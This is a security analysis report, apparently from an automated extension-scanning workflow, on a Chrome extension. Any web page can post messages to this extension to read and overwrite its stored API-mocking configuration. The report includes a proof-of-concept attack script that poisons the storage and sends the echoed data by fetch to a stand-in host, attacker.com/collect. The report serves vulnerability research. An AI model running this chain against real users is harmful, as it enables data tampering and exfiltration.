# CoCo Analysis: ddanhohibbdkfffbbaojncmjjlcbpkdk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ddanhohibbdkfffbbaojncmjjlcbpkdk/opgen_generated_files/cs_0.js
Line 518: `function(e) {`
Line 519: `let messagedata = e.data;`
Line 522: `{ type: 'add', data: messagedata.data }`

**Code:**

```javascript
// Content script (cs_0.js) - Entry point (lines 516-528)
window.addEventListener(
    'message',
    function(e) {
        let messagedata = e.data; // ← attacker-controlled via postMessage
        if (messagedata.type === 'add') {
            chrome.runtime.sendMessage(
                { type: 'add', data: messagedata.data }, // ← forwards to background
                function() {}
            );
        }
    },
    false
);

// Background script (bg.js) - Message handler (lines 973-998)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    switch (request.type) {
        case 'add': // 添加
            chrome.storage.local.get(['ajaxInterceptData'], function(result) {
                let ajaxInterceptData = result.ajaxInterceptData || [];
                ajaxInterceptData.unshift(request.data); // ← attacker data added
                chrome.storage.local.set(
                    { ajaxInterceptData: ajaxInterceptData }, // ← storage write sink
                    function() {
                        updateInterceptData(); // ← triggers retrieval path
                        alert('同步成功');
                    }
                );
            });
            break;
    }
});

// Background script - Retrieval path (lines 1016-1039)
function updateInterceptData() {
    chrome.storage.local.get(
        ['ajaxInterceptData', 'ajaxInterceptIsOpen', 'whiteList', 'yapiWhiteList'],
        function(result) {
            if (result) {
                chrome.tabs.query(
                    { active: true, currentWindow: true },
                    function(tabs) {
                        chrome.tabs.sendMessage(
                            tabs[0].id,
                            result, // ← sends poisoned data back to content script
                            function() {}
                        );
                    }
                );
            }
        }
    );
}

// Content script - Message receiver (lines 505-512)
chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    sendResponse('我收到了你的消息！');
    storageLocal(); // ← retrieves and posts back to webpage
});

// Content script - Exfiltration path (lines 483-503)
function storageLocal() {
    chrome.storage.local.get(
        ['ajaxInterceptIsOpen', 'ajaxInterceptData', 'whiteList', 'yapiWhiteList'],
        function(result) {
            window.postMessage(
                {
                    ajaxInterceptData: result.ajaxInterceptData || [], // ← poisoned data
                    ajaxInterceptIsOpen: result.ajaxInterceptIsOpen || false,
                    whiteList: result.whiteList || '',
                    yapiWhiteList: result.yapiWhiteList || '',
                },
                '*' // ← posts back to attacker webpage
            );
        }
    );
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// On attacker's malicious webpage:

// Step 1: Poison storage with malicious data
window.postMessage({
    type: 'add',
    data: {
        maliciousPayload: 'attacker-controlled-data',
        url: 'https://attacker.com/steal',
        mockResponse: 'evil-response'
    }
}, '*');

// Step 2: Trigger retrieval by sending another message
// The extension automatically calls updateInterceptData() after storage write,
// which sends the data back to content script, which posts it back to webpage

// Step 3: Listen for the exfiltrated data
window.addEventListener('message', function(e) {
    if (e.data.ajaxInterceptData) {
        console.log('Retrieved poisoned data:', e.data.ajaxInterceptData);
        // Send to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(e.data)
        });
    }
});
```

**Impact:** Complete storage exploitation chain. An attacker can:
1. Inject arbitrary data into chrome.storage.local via postMessage
2. Retrieve the poisoned data back via the same postMessage channel
3. Manipulate the extension's mock API configuration (ajaxInterceptData)
4. Potentially interfere with the extension's API mocking functionality to intercept or modify API responses on the page

This is a bidirectional storage poisoning vulnerability where the attacker has full read/write access to the extension's storage through the postMessage interface.
